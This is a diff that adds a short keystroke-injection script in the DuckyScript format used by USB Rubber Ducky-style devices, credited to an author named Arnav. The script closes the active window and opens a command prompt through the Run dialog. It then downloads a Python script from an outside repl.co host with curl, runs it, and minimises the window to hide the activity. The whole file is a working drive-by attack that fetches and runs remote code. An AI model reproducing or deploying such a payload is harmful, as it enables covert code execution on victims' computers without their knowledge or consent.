@@ -1,0 +1,14 @@
+REM Author: Arnav
+DELAY 1000
+ALT F4
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING curl -o script.py https://script.cyberhouse.repl.co/script.txt
+ENTER
+DELAY 3000
+STRING python script.py
+ENTER
+WINDOWS down
